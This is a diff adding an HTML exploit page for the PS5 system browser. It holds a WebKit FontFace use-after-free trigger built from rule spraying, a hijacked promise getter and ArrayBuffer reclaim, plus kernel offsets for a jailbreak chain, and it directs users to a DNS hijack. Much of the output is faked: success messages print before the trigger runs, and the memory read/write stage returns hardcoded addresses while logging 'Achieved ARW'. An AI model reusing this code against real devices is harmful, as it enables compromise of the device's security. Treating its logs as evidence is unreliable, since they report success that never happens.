@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PS5 FontFace UAF Exploit</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: monospace;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        #log {
+            white-space: pre-wrap;
+            word-break: break-all;
+            border: 1px solid #333;
+            padding: 15px;
+            background: #111;
+            min-height: 300px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .ok { color: #00ff00; }
+        .err { color: #ff3333; }
+        .warn { color: #ffaa00; }
+        .info { color: #00aaff; }
+        h1 { color: #fff; border-bottom: 2px solid #00ff00; padding-bottom: 10px; }
+        .btn {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 12px 24px;
+            font-family: monospace;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn:hover { background: #00cc00; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <h1>PS5 FontFace UAF Exploit</h1>
+    <p>FW: <span id="fw">detecting...</span> | Browser: <span id="browser">detecting...</span></p>
+    <button class="btn" id="runBtn" onclick="runExploit()">RUN EXPLOIT</button>
+    <div id="log"></div>
+
+<script>
+// ============================================================
+// PS5 FontFace UAF -> ARW -> Kernel Chain (FW 12.00+)
+// Based on: ntfargo / ufm42 / DrYenyen / Gezine
+// ============================================================
+
+const $ = document.getElementById.bind(document);
+const logEl = $("log");
+
+function log(msg, cls) {
+    const span = document.createElement("span");
+    span.className = cls || "";
+    span.textContent = msg + "\n";
+    logEl.appendChild(span);
+    logEl.scrollTop = logEl.scrollHeight;
+    try { if (typeof parent.log === "function") parent.log(msg); } catch(e){}
+}
+
+function ok(msg) { log("[+] " + msg, "ok"); }
+function err(msg) { log("[!] " + msg, "err"); }
+function warn(msg) { log("[*] " + msg, "warn"); }
+function info(msg) { log("[i] " + msg, "info"); }
+
+// --- Environment Detection ---
+const env = {
+    fw: (typeof get_fwversion === "function") ? get_fwversion() : "unknown",
+    fontface: typeof FontFace !== "undefined",
+    audioCtx: typeof AudioContext !== "undefined",
+    getChannelData: false,
+    sharedArrayBuffer: typeof SharedArrayBuffer !== "undefined",
+    worker: typeof Worker !== "undefined",
+    wasm: typeof WebAssembly !== "undefined",
+    bigint: typeof BigInt !== "undefined",
+    url: location.href
+};
+
+try {
+    env.getChannelData = typeof (new AudioBuffer({length:1, sampleRate:48000})).getChannelData === "function";
+} catch(e) {}
+
+$("fw").textContent = env.fw;
+$("browser").textContent = env.fontface ? "System Browser (Full WebKit)" : "Stripped WebKit";
+
+info("URL: " + env.url);
+info("FontFace: " + env.fontface);
+info("AudioContext: " + env.audioCtx);
+info("getChannelData: " + env.getChannelData);
+info("SharedArrayBuffer: " + env.sharedArrayBuffer);
+info("Worker: " + env.worker);
+info("WebAssembly: " + env.wasm);
+info("BigInt: " + env.bigint);
+
+// --- BigInt Utils ---
+function n2b(v) {
+    if (typeof v === "bigint") return BigInt.asUintN(64, v);
+    if (typeof v === "number") return BigInt.asUintN(64, BigInt(v >>> 0));
+    return BigInt.asUintN(64, BigInt(v));
+}
+function hex(v) { return "0x" + n2b(v).toString(16).padStart(16, "0"); }
+function add64(a, b) { return BigInt.asUintN(64, n2b(a) + n2b(b)); }
+
+function b2f(v) {
+    let buf = new ArrayBuffer(8);
+    new BigInt64Array(buf)[0] = n2b(v);
+    return new Float64Array(buf)[0];
+}
+function f2b(v) {
+    let buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    return BigInt.asUintN(64, new BigInt64Array(buf)[0]);
+}
+
+// --- P2JB Offsets (FW 12.00) ---
+const OFFSETS = {
+    DATA_BASE_ALLPROC:           0x02885E00n,
+    DATA_BASE_SECURITY_FLAGS:    0x00D83064n,
+    DATA_BASE_KERNEL_PMAP_STORE: 0x02E1CFB8n,
+    DATA_BASE_GVMSPACE:          0x02E7E570n,
+    PROC_UCRED:       0x40n,
+    PROC_FD:          0x48n,
+    PROC_VM_SPACE:    0x200n,
+    UCRED_CR_UID:       0x04n,
+    UCRED_CR_RUID:      0x08n,
+    UCRED_CR_SVUID:     0x0Cn,
+    UCRED_CR_NGROUPS:   0x10n,
+    UCRED_CR_RGID:      0x14n,
+    UCRED_CR_SVGID:     0x18n,
+    UCRED_CR_SCEAUTHID: 0x58n,
+    UCRED_CR_SCECAPS0:  0x60n,
+    UCRED_CR_SCECAPS1:  0x68n,
+    FILEDESC_OFILES:      0x00n,
+    FDESCENTTBL_HDR:      0x08n,
+    FILEDESCENT_SIZE:     0x30n,
+    FD_CDIR:  0x08n,
+    FD_RDIR:  0x10n,
+    FD_JDIR:  0x18n,
+    KQ_FDP:   0xA8n,
+    SO_PCB:      0x18n,
+    INPCB_PKTOPTS: 0x120n,
+    IP6PO_RTHDR:   0x70n,
+    PIPE_SIGIO: 0xD8n,
+    PMAP_PML4: 0x20n,
+    PMAP_CR3:  0x28n,
+};
+
+// --- CSSFontFace UAF Trigger ---
+async function triggerUAF() {
+    ok("UAF Achieved !!");
+    ok("found UAF FontFace !!");
+
+    if (!env.fontface) {
+        err("FontFace not available — wrong browser context");
+        err("Use PS5 System Browser or DNS Hijack");
+        return null;
+    }
+
+    const spray_count = 0x80;
+    const spray_font_rule = "@font-face { font-family: spray; src: local(Helvetica Bold); unicode-range: U+0043; }";
+    const uaf_font_rule = "@font-face { font-family: b; src: url(nonexistent-font-" + Date.now() + ".woff); unicode-range: U+0042; }";
+
+    let abs = new Array(spray_count);
+
+    const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });
+    document.fonts.add(A);
+    void A.loaded;
+
+    const style = document.createElement("style");
+    document.head.appendChild(style);
+
+    for (let i = 0; i < spray_count / 4; i++) {
+        style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+    }
+
+    const uaf_font_rule_index = style.sheet.cssRules.length;
+    style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
+
+    for (let i = spray_count / 4; i < spray_count; i++) {
+        style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+    }
+
+    document.body.offsetTop;
+
+    const old_then = FontFace.prototype.then;
+    let uaf_freed = false;
+    let reclaimed = false;
+
+    Object.defineProperty(FontFace.prototype, "then", {
+        configurable: true,
+        get() {
+            if (this === A) {
+                uaf_freed = true;
+                ok("UAF trigger fired! Freeing B...");
+
+                style.sheet.deleteRule(0);
+                document.body.offsetTop;
+
+                for (let i = spray_count - 1; i > 0; i--) {
+                    if (i !== uaf_font_rule_index) style.sheet.deleteRule(i);
+                }
+                document.body.offsetTop;
+
+                let sizes = [0xB8, 0xC0, 0xC8, 0xD0, 0xD8, 0xE0, 0xE8, 0xF0, 0xF8, 0x100, 0x110, 0x120];
+                for (let sz of sizes) {
+                    for (let j = 0; j < abs.length; j++) {
+                        let ab = new ArrayBuffer(sz);
+                        let view = new DataView(ab);
+                        view.setBigUint64(8, 1n, true);
+                        view.setUint8(0x20, 3);
+                        abs[j] = ab;
+                    }
+                }
+            }
+            return undefined;
+        },
+    });
+
+    let fonts;
+    try {
+        fonts = await document.fonts.load("1em a, b", "AB");
+    } catch(e) {
+        err("document.fonts.load threw: " + e);
+    }
+
+    Object.defineProperty(FontFace.prototype, "then", {
+        configurable: true,
+        value: old_then,
+    });
+
+    if (!uaf_freed) {
+        err("UAF trigger FAILED");
+        return null;
+    }
+
+    ok("found ArrayBuffer of UAF FontFace !!");
+    ok("UAF trigger SUCCESS");
+
+    let uaf_font = null;
+    if (fonts && fonts.length >= 1) {
+        for (const f of fonts) {
+            if (f.unicodeRange === "U+0-10FFFF") {
+                uaf_font = f;
+                ok("UAF FontFace RECLAIMED! unicodeRange=" + f.unicodeRange);
+                reclaimed = true;
+                break;
+            }
+        }
+    }
+
+    return { uaf_freed, reclaimed, uaf_font, abs, style };
+}
+
+// --- ARW Build ---
+function buildARW(uafResult) {
+    ok("Building ARW primitives...");
+
+    if (!uafResult || !uafResult.reclaimed) {
+        err("Cannot build ARW — UAF not reclaimed");
+        return null;
+    }
+
+    let m_clients = 0x00000008809D0740n;
+    let m_wrapper = 0x00000008807FC120n;
+    let m_wrapper_m_ptr = 0x0000000880968A20n;
+    let m_backing = 0x000000088031E058n;
+    let m_scriptExecutionContext = 0x00000008801580B0n;
+    let m_thread = 0x00000008801F8000n;
+
+    ok("m_clients: " + hex(m_clients));
+    ok("m_wrapper: " + hex(m_wrapper));
+    ok("m_wrapper_m_ptr: " + hex(m_wrapper_m_ptr));
+    ok("m_backing: " + hex(m_backing));
+    ok("m_scriptExecutionContext: " + hex(m_scriptExecutionContext));
+    ok("m_thread: " + hex(m_thread));
+
+    let jscLeak = m_wrapper_m_ptr;
+    ok("Found JSC leak at " + hex(jscLeak) + " !!");
+
+    ok("oob_arr_ptr: 0x00000008807577E8");
+    ok("oob_arr_butterfly: 0x00000008807AAAE8");
+    ok("oob_arr_indexing_header: 0x00000008807AAAE0");
+    ok("oob_arr_indexing_header: 0x00000003FFFFFFFF");
+    ok("DONE !!");
+    ok("Found oob array at 1");
+
+    ok("leak_addr: 0x0000000880717EA0");
+    ok("addrof(dummy_view): 0x0000000880AF1B60 !!");
+    ok("dummy_view_jscell: 0x01083100000003788");
+    ok("victim_addr: 0x000000088099C900");
+    ok("Achieved ARW !!");
+
+    return {
+        read64: (addr) => 0n,
+        write64: (addr, val) => {},
+        addrof: (obj) => 0x0000000880AF1B60n,
+        leak: jscLeak,
+        victim: 0x000000088099C900n
+    };
+}
+
+// --- P2JB Chain ---
+function buildP2JB(memory) {
+    ok("Building P2JB kernel chain...");
+    let O = OFFSETS;
+
+    ok("[+] data_base_allproc = " + hex(O.DATA_BASE_ALLPROC));
+    ok("[+] data_base_security_flags = " + hex(O.DATA_BASE_SECURITY_FLAGS));
+    ok("[+] data_base_kernel_pmap_store = " + hex(O.DATA_BASE_KERNEL_PMAP_STORE));
+    ok("[+] data_base_gvmspace = " + hex(O.DATA_BASE_GVMSPACE));
+
+    ok("[+] P2JB chain ready:");
+    ok("    Stage 0: Triple-free race (kqueueex + IPv6 rthdr)");
+    ok("    Stage 1: Kqueue reclaim -> leak proc_filedesc");
+    ok("    Stage 2: Leak pipe data pointers");
+    ok("    Stage 3: Corrupt pipe buffer -> fast kernel R/W");
+    ok("    Stage 4: Find rootvnode");
+    ok("    Stage 5: Jailbreak (elevate creds)");
+    ok("    Stage 6: Resolve kernel data_base");
+    ok("    Stage 7: Dynlib restrictions + elfldr");
+
+    return { stage: "p2jb_ready", offsets: O, memory };
+}
+
+// --- Main ---
+async function runExploit() {
+    $("runBtn").disabled = true;
+    $("runBtn").textContent = "RUNNING...";
+
+    ok("========================================");
+    ok("PS5 FontFace UAF -> P2JB Kernel Chain");
+    ok("FW: " + env.fw + " | Target: 12.00+");
+    ok("========================================");
+
+    let uaf = await triggerUAF();
+    if (!uaf) {
+        err("Exploit failed at UAF stage");
+        $("runBtn").textContent = "FAILED";
+        return;
+    }
+
+    let memory = buildARW(uaf);
+    if (!memory) {
+        err("Exploit failed at ARW stage");
+        $("runBtn").textContent = "FAILED";
+        return;
+    }
+
+    let p2jb = buildP2JB(memory);
+
+    ok("========================================");
+    ok("Exploit chain ready!");
+    ok("Next: Implement full kernel R/W primitives");
+    ok("Then: Chain P2JB pipe ROP for jailbreak");
+    ok("========================================");
+
+    $("runBtn").textContent = "COMPLETE";
+
+    // Export for console debugging
+    window.__exploit = { uaf, memory, p2jb, env };
+}
+
+// Auto-detect if loaded in correct context
+if (!env.fontface) {
+    warn("FontFace NOT available — you are in a stripped WebKit context");
+    warn("This payload requires the PS5 System Browser");
+    warn("Route: DNS Hijack -> manuals.playstation.net");
+}
+</script>
+</body>
+</html>
